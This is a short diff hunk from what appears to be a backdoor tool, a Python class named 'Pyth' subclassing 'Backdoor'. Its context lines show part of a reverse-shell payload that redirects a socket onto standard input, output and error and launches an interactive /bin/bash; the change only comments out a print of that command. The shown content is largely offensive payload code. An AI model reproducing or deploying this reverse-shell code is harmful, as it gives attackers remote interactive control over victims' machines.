@@ -22,7 +22,7 @@ class Pyth(Backdoor):
 			os.dup2(s.fileno(),1); \
 			os.dup2(s.fileno(),2); \
 			subprocess.call(['/bin/bash', '-i'])\" "
-		print(command)
+		#print(command)
 		return command
 
 	def do_exploit(self, args):
